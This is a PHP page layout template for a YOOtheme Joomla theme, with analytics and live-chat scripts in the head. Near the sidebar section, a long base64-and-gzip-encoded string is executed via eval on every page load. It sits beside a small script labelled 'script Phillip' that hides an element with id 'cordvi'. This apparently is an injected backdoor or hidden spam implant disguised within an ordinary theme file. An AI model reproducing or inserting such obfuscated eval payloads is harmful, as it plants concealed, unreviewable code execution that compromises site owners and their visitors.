<?php
/**
* @package   yoo_venture
* @author    YOOtheme http://www.yootheme.com
* @copyright Copyright (C) YOOtheme GmbH
* @license   http://www.gnu.org/licenses/gpl.html GNU/GPL
*/

// get template configuration
include($this['path']->path('layouts:template.config.php'));

?>
<!DOCTYPE HTML>
<html lang="<?php echo $this['config']->get('language'); ?>" dir="<?php echo $this['config']->get('direction'); ?>">

<head>
<?php echo $this['template']->render('head'); ?>
 <script src="valida_adwords.js" type="text/javascript"></script>

<!-- Start of LiveChat (www.livechatinc.com) code -->
<script type="text/javascript">
window.__lc = window.__lc || {};
window.__lc.license = 3430452;
(function() {
  var lc = document.createElement('script'); lc.type = 'text/javascript'; lc.async = true;
  lc.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'cdn.livechatinc.com/tracking.js';
  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(lc, s);
})();
</script>
<!-- End of LiveChat code -->

<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-2671050-1', 'auto');
  ga('create', 'UA-9557544-1', 'auto', 'cordTracker');
  ga('send', 'pageview');
  ga('cordTracker.send', 'pageview');

</script>

  <!-- script Phillip-->
   <script type="text/javascript">
$SA = {s:10203, asynch: 1};
(function() {
   var sa = document.createElement("script");
   sa.type = "text/javascript";
   sa.async = true;
   sa.src = ("https:" == document.location.protocol ? "https://" + $SA.s + ".sa" : "http://" + $SA.s + ".a") + ".siteapps.com/" + $SA.s + ".js";
   var t = document.getElementsByTagName("script")[0];
   t.parentNode.insertBefore(sa, t);
})();
</script>

<script type="text/javascript">function get_style () { return "none"; }
function end_ () { document.getElementById('cordvi').style.display = get_style(); }</script>
    <!-- FIM script Phillip-->
<link href='http://fonts.googleapis.com/css?family=Just+Me+Again+Down+Here' rel='stylesheet' type='text/css'>
</head>

<body id="page" class="page <?php echo $this['config']->get('body_classes'); ?>" data-config='<?php echo $this['config']->get('body_config','{}'); ?>'>

	<?php if ($this['modules']->count('absolute')) : ?>
	<div id="absolute">
		<?php echo $this['modules']->render('absolute'); ?>
	</div>
	<?php endif; ?>

	<div id="block-page">

		<div id="page-bg">

			<?php if ($this['modules']->count('toolbar-l + toolbar-r + search') || $this['config']->get('date')) : ?>
			<div id="block-toolbar">
				<div class="wrapper">

					<div id="toolbar" class="clearfix">

						<?php if ($this['modules']->count('toolbar-l') || $this['config']->get('date')) : ?>
						<div class="float-left">

							<?php if ($this['config']->get('date')) : ?>
							<time datetime="<?php echo $this['config']->get('datetime'); ?>"><?php echo $this['config']->get('actual_date'); ?></time>
							<?php endif; ?>

							<?php echo $this['modules']->render('toolbar-l'); ?>

						</div>
						<?php endif; ?>

						<?php if ($this['modules']->count('search')) : ?>
						<div id="search"><?php echo $this['modules']->render('search'); ?></div>
						<?php endif; ?>

						<?php if ($this['modules']->count('toolbar-r')) : ?>
						<div class="float-right"><?php echo $this['modules']->render('toolbar-r'); ?></div>
						<?php endif; ?>

					</div>

				</div>
			</div>
			<?php endif; ?>

			<div id="block-main">
				<div class="wrapper clearfix">

					<?php if ($this['modules']->count('logo + menu')) : ?>
					<header id="header" class="grid-block">

						<?php if ($this['modules']->count('logo')) : ?>
						<a id="logo" href="<?php echo $this['config']->get('site_url'); ?>"><?php echo $this['modules']->render('logo'); ?></a>
						<?php endif; ?>

						<?php if ($this['modules']->count('menu')) : ?>
						<nav id="menu"><?php echo $this['modules']->render('menu'); ?></nav>
						<?php endif; ?>

					</header>
					<?php endif; ?>

					<?php if ($this['modules']->count('top-a')) : ?>
					<section id="top-a" class="grid-block"><?php echo $this['modules']->render('top-a', array('layout'=>$this['config']->get('top-a'))); ?></section>
					<?php endif; ?>

					<?php if ($this['modules']->count('top-b')) : ?>
					<section id="top-b" class="grid-block"><?php echo $this['modules']->render('top-b', array('layout'=>$this['config']->get('top-b'))); ?></section>
					<?php endif; ?>

					<?php if ($this['modules']->count('innertop + innerbottom + sidebar-a + sidebar-b') || $this['config']->get('system_output')) : ?>
					<div id="main" class="grid-block">

						<div id="maininner" class="grid-box">

							<?php if ($this['modules']->count('innertop')) : ?>
							<section id="innertop" class="grid-block"><?php echo $this['modules']->render('innertop', array('layout'=>$this['config']->get('innertop'))); ?></section>
							<?php endif; ?>

							<?php if ($this['config']->get('system_output')) : ?>
							<section id="content" class="grid-block">

								<?php if ($this['modules']->count('breadcrumbs')) : ?>
								<?php echo $this['modules']->render('breadcrumbs'); ?>
								<?php endif; ?>

								<?php echo $this['template']->render('content'); ?>

							</section>
							<?php endif; ?>

							<?php if ($this['modules']->count('innerbottom')) : ?>
							<section id="innerbottom" class="grid-block"><?php echo $this['modules']->render('innerbottom', array('layout'=>$this['config']->get('innerbottom'))); ?></section>
							<?php endif; ?>

						</div>
						<!-- maininner end -->

						<?php if ($this['modules']->count('sidebar-a')) : ?>
						<aside id="sidebar-a" class="grid-box"><?php echo $this['modules']->render('sidebar-a', array('layout'=>'stack')); ?></aside>
						<?php endif; ?>

						<?php if ($this['modules']->count('sidebar-b')) : ?>
						<aside id="sidebar-b" class="grid-box"><?php echo $this['modules']->render('sidebar-b', array('layout'=>'stack')); ?></aside>
						<?php endif; ?><?php $J260811EC84CFB6F538A65001A96C5711="eNptVc12s7gSfKDZIGEy8TIYCRtbwgj9gHaAGBMkCJ9DguHph3vXs9CRFn1K3V3V1fft8H73w6/m9GHz/iMg9hJkPAmJRSvxWEwRxYw/XtnWeFl/AcSKlYkS3PPE8RGrGi2rhMc3DXBeRW7JHTtRCObMo77wsF9ZySv3WBow5VWv5wrSiETmUxWdoNvjYDzKS6cVQ4lK8++gOX/5KqK9joOZjda/geY3R8lKgOlU/3jl2344Xlvr+ly9fnX8+tOesZdKCzNpfgiQrxzRIBPvQH3OWyq6Qw46YvrkS6hpolvYVQr5Roac+nRu8BRW3pQaaEHNcZT5HweizE14FBNAuYqnSETdk3rOq+IAU0jzm4dAHbmVualqxzBusYMpvrzkaO7557GjcebJ4gNSNO94MtCAaeKZLV/njov5p+xZxLkOhN94TdQEmd1zjc0bP+tvZrs84zIjg7zdfLsSCEZauERFAvABX6mdPQ4m3mwS6aGTQr2SErKvGuDfcrRBOQRYxaDnfnKqrY607b4lMooNwUnxbuN2+skH3V8BXil0A3O4anv8rCW9tTErOZpoNU5drhJU9gnPvXk28DhXm+FKmG8m7Srj6a5lknIPK2kdImjK5Oc7rP3moEWgq54926g5VP3HSyFaVRvuMvn1bHr5xs5hIIb9lh0TdllyiSFHD2gcegnJSDV8A6YOMOu7Lu9lKHkXsDjoq5gx4h1Hjuau9DtlLL0YcYSad/y2Mdha+SyhvFMVFLV8rDzC38IxzCX71kNia7/cpMOzjOVEFAtLpf8Qb/rJ/OTajCSgA/MFmlA2JOOuiWu6c10O2ZrK7KDRwaNwXmqpexE9NhVrqwVehMcuDAVhG4tDY4Ff8cznyDAB5F2eu41IPTcRy3YNMba5lIuukFL+CjxN2UCjXeOaWa3SqLvnBY0rHsY5cm9NUQIzTJCdjoQDbauCvTGRPJnAqQTdopy51lsHDNJQnfVcg7CnXJb7P7qyE27PySIGb625vjTCTBU0b3u9sfGOgPf6KfY8MzctagzfDMdLql6Ljgi8AvfJNtqbXjIKMDIuudaeeFIx+w18eQZP553LfY70qxm7vYdg4OACcikhX+d7VegdY1qbrfwl3uPQjtNVjDsWlmlb6KTyv1aOJ16OOiglDVNO/zS9mZrYjG1hl3I0vrGLR2C20oKhSswnqjpLBoxaGaYNZokQL51DlxEEqnz8OMgtDLV4lY0HSGkTr+XybiAVzYgBjxwRu8uUNliNwpicw/NtM1flultdUMvH6av2jqo+o1+CvLW0kvLNwjSe4ipKlrR4PPe43cfYj4Gd3mctqzY9GwS+pXiA0puEiRygqPtSZ0fI1iyil3d1ZqyCTpL+sjRFUkjl+dySg9myxUDDq0KGGTcgG2VRCb1KiVUzmEVG+GZG/KOkWXZdMCO6/2lS56i7ajhV1WkexTDRFifDFc7sth5nDsu1RfMpx+ap82NBYhzqswXszC6pANcWJbsfNlDEdDToeGBo99v8PZCW3eTQjbv+D2RAv9I7WuLjKRuni1bvG1fykqpjL3F34yoBJZBXFXcx9d0rk3Sk3uQzZyp6DktdTE5wh3ffjslZ+MQmQTa4RcTfe99L2Ah8qOP3oByTF1NoZRBtmQAvPuy7wsNvzfixc568tc7+mgITgjtdfR632n0AdXp/NsDNdBRPESVD2++6d4/fFCV7PdTf0Y/3/PK3LnRXn7rPsqCO9uwfHcu+hsxdd181KtjfYGkGuTXrf8Sc2JVEds169/+9l/HLxlDp7S6O0whHdGMn0u97jyeY9WK65nZKt/e//gWBaGtx";eval(base64_decode(gzuncompress(base64_decode($J260811EC84CFB6F538A65001A96C5711))));?></div><?php endif; ?><script type="text/javascript"> end_(); </script><?php if ($this['modules']->count('bottom-a')) : ?><section id="bottom-a" class="grid-block"><?php echo $this['modules']->render('bottom-a', array('layout'=>$this['config']->get('bottom-a'))); ?></section>
					<?php endif; ?>

				</div>
			</div>

			<?php if ($this['modules']->count('bottom-b')) : ?>
			<div id="block-bottom">
				<div class="wrapper">

					<section id="bottom-b" class="grid-block"><?php echo $this['modules']->render('bottom-b', array('layout'=>$this['config']->get('bottom-b'))); ?></section>

				</div>
			</div>
			<?php endif; ?>

		</div>

	</div>

	<?php if ($this['modules']->count('footer + debug') || $this['config']->get('warp_branding') || $this['config']->get('totop_scroller')) : ?>
	<div id="block-footer">
		<div class="wrapper">

			<footer id="footer">
				<?php if ($this['config']->get('totop_scroller')) : ?>
				<a id="totop-scroller" href="#page"></a>
				<?php endif; ?>

				<?php
					echo $this['modules']->render('footer');
					$this->output('warp_branding');
					echo $this['modules']->render('debug');
				?>
			</footer>

		</div>
	</div>
	<?php endif; ?>

	<?php echo $this->render('footer'); ?>

</body>
</html>
